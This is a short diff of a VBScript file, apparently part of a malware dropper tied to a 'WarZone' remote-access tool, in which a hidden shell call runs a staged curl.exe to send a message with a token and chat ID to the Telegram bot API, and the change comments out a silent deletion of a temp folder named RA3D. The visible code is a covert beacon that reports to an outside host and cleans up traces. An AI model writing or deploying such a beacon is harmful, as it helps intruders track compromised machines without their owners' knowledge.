@@ -21,4 +21,4 @@ End If
 
 ' Notification '
 oShell.Run "C:\Users\Public\WarZone\curl.exe -k https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + text + "--WarZone--",0,True
-oShell.Run "cmd.exe /c rmdir %temp%\RA3D /S /Q",0,True
+'oShell.Run "cmd.exe /c rmdir %temp%\RA3D /S /Q",0,True
